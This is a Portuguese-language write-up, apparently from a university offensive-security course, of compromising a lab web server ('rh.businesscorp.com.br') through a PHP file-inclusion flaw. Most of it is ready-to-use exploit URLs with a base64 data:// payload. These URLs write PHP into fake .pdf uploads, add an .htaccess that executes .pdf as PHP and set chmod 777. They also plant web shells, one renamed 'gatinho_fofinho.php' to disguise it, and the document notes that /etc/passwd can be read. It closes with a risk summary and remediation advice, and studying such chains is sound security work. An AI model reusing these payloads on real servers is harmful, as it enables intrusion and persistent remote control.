# 🔍 Exploração do Site — 👨‍🔬 Penetratium ☢️ - 🧬 Team 📡

## 🔗 Materia Segurança Ofensiva 📕

- 👨‍🏫 **Professor:** JPGress
- 🔍 **Tipo:** Comand Injection

---

## 📂 Descoberta do Banco de Dados  

Foi identificado o diretório da aplicação que armazena os **uploads de currículos**.  
Com isso, é possível enviar arquivos maliciosos (.pdf) e executá-los no servidor.  

🔗 Teste inicial:  /var/www/html/uploads
```
http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=ls%20-la%20/var/www/html/uploads
```

📌 Confirmação: Banco de dados e diretório de uploads identificado.  ( aceita somente arquivos .pdf)

---

## 📤 Upload de Arquivo TESTE(.pdf)

Comando para envio do arquivo TESTE:  
```
http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=echo%20%27%25PDF-1.4%0A%25%E2%E3%CF%D3%0A%0A%3C?php%20echo%20%22TESTE%20FUNCIONOU%22%3B%20%3F%3E%27%20%3E%20%2Fvar%2Fwww%2Fhtml%2Fuploads%2Fteste.pdf
```

📌 Verificação:  
🔗 [http://rh.businesscorp.com.br/uploads/teste.pdf](http://rh.businesscorp.com.br/uploads/teste.pdf)  

<p align="center">
  <img width="477" height="83" alt="image" src="https://github.com/user-attachments/assets/16a55f59-ce69-440a-b049-861819f3f9fe" />
</p>

---

## ⚙️ Criação do `.htaccess`  

Arquivo necessário para permitir a execução de **.pdf** como PHP:  

```
http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=echo%20%27AddType%20application%2Fx-httpd-php%20.pdf%27%20>%20%2Fvar%2Fwww%2Fhtml%2Fuploads%2F.htaccess
```

🔑 Ajustando permissões:  
```
http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=chmod%20777%20/var/www/html/uploads/.htaccess
```

📌 Resposta :  
```
    -rwxrwxrwx  1 www-data www-data    37 Sep 19 08:57 .htaccess

```

---

## 📥 Upload de um Prompt de Comando  

Comando utilizado para envio do **cmd.pdf**:  
```

    ** conteudo do cmd: <?php system($_GET['cmd']); ?> **

envio desse conteudo:

http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=echo%20'%25PDF-1.4%0A%25%E2%E3%CF%D3%0A%0A%3C?php%20echo%20%22%3Cform%20method%3DGET%3E%3Cinput%20type%3Dtext%20name%3Dcmd%20placeholder%3DDigite%20um%20comando%3E%3Cinput%20type%3Dsubmit%20value%3DExecutar%3E%3C%2Fform%3E%3Cpre%3E%22%3B%20if(isset(%24_GET%5B%22cmd%22%5D))%20%7B%20system(%24_GET%5B%22cmd%22%5D)%3B%20%7D%20echo%20%22%3C%2Fpre%3E%22%3B%20%3F%3E'%20%3E%20%2Fvar%2Fwww%2Fhtml%2Fuploads%2Fcmd.pdf
```

🔗 Acesso ao arquivo: http://rh.businesscorp.com.br/uploads/cmd.pdf 

<p align="center">
  <img width="488" height="132" alt="image" src="https://github.com/user-attachments/assets/ab571ec0-a668-4244-98ab-ffc7f5c209ec" />
</p>

📌 O prompt foi criado com sucesso.  

---

## 🔑 Ajustando Permissões do Prompt

🔗 Comando para aplicar permissões:  
```
http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=chmod%20777%20/var/www/html/uploads/cmd.pdf
```

- Resultado :  
<p align="center">
  <img width="430" height="163" alt="image" src="https://github.com/user-attachments/assets/f9528674-fdc2-40a8-a4e3-e33de04431b5" />
</p>

---

## ✍️ Mensagem Ética

Para assegurar que a atividade foi apenas acadêmica, foi deixada a seguinte mensagem no servidor:  

```
echo "Olá, meu nome é Luan. Não sou um hacker mal-intencionado, sou apenas um estudante da Faculdade IESGO.  
Meu GitHub é https://github.com/Luanqmata. Caso alguém encontre este arquivo, saiba que não tenho más intenções.  
Trata-se apenas de uma atividade acadêmica.  
Contato: calazanscybersec@gmail.com" > hacked_by_luan.txt
```

<p align="center">
  <img width="284" height="135" alt="image" src="https://github.com/user-attachments/assets/7bc73941-7650-47a3-a4b0-c9cc03927e7e" />
</p>

---

## 🖥️ Descobrindo o Caminho do Bash

- Comando para identificar o caminho do bash:

```
which bash
```

- Caminho identificado: `/bin/bash`

- Comando para apagar arquivos criados (use com cautela):

```
rm /var/www/html/nome_arquivo.php
```

---

## 📂 Criação do Arquivo de Prompt de Comando

Arquivo criado no diretório `/var/www/html` com o seguinte comando:

```
http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=echo%20'%3C?php%20echo%20%22%3Cform%20method%3DGET%3E%3Cinput%20type%3Dtext%20name%3Dcmd%20placeholder%3DDigite%20um%20comando%3E%3Cinput%20type%3Dsubmit%20value%3DExecutar%3E%3C/form%3E%3Cpre%3E%22%3B%20if(isset(%24_GET%5B%22cmd%22%5D))%20%7B%20system(%24_GET%5B%22cmd%22%5D)%3B%20%7D%20echo%20%22%3C/pre%3E%22%3B%20%3F%3E'%20%3E%20/var/www/html/web_shell.php
```

Aplicando permissões:

```
http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=chmod%20777%20/var/www/html/web_shell.php
```

Acesso ao arquivo: [web\_shell.php](http://rh.businesscorp.com.br/web_shell.php)

<p align="center">
  <img width="526" height="442" alt="image" src="https://github.com/user-attachments/assets/14fc622f-5f4d-4596-862b-21f8bb10184a" />
</p>

---

## ⚠️ Teste de Conexão

Apesar do arquivo estar pronto, a shell não conseguiu estabelecer a conexão reversa devido à máquina alvo estar em uma rede diferente.

<p align="center">
  <img width="496" height="158" alt="image" src="https://github.com/user-attachments/assets/11aa8f93-6f35-4c36-9f44-0511c6209e8a" />
</p>

<p align="center">
  <img width="471" height="149" alt="image" src="https://github.com/user-attachments/assets/d8e5427b-2d70-41b0-9b5c-b7c1d74dfb66" />
</p>

---

## 🔒 Observações

* O shell reverso não funcionou, mas é possível acessar arquivos sensíveis como `/etc/passwd` após a escalada de privilégios no `web_shell.sh`.
* Recomenda-se apagar o shell `.pdf` e utilizar apenas o `web_shell.sh` para exploração segura de arquivos sensíveis.

```
Caminho do prompt antigo : /var/www/html/uploads

  rm /var/www/html/uploads/cmd.pdf
  rm /var/www/html/uploads/.htaccess

```
- Depois de apagar o cmd.pdf e o .htaccess ficou assim o banco de dados de upload:

<p align="center">
  <img width="550" height="183" alt="image" src="https://github.com/user-attachments/assets/5c38d227-a733-4e5c-95b8-0d680ef641e7" />
</p>

- Obs : esse l.pdf ( Não fui eu que criei! ) .

---

## Camuflando o arquivo malicioso!!
- Usando o mesmos parametros que usei antes para a criação do web_shell.sh
- porém com o nome de " gatinho_fofinho.php "

<p align="center">
  <img width="530" height="438" alt="image" src="https://github.com/user-attachments/assets/415122a1-7366-4441-8241-57881a137d71" />
</p>

---

## ⚠️ Conclusão 

- O servidor analisado apresenta vulnerabilidades críticas e de alto risco:
  - Permite upload e execução de arquivos maliciosos, mesmo com extensão .pdf.
  - Permite alteração de permissões, criação e exclusão de arquivos pelo usuário da aplicação.
  - Apresenta uma falha grave de Remote Code Execution (RCE), permitindo execução arbitrária de comandos no servidor.
  - Possibilita acesso a arquivos sensíveis, como /etc/passwd, após escalada de privilégios no web_shell.sh.

🚨 Risco: Comprometimento total do sistema, podendo levar à exposição de dados críticos e controle completo do servidor.
💡 Recomendação: Remover imediatamente shells e arquivos maliciosos, revisar políticas de upload e permissões, e corrigir a vulnerabilidade de RCE.
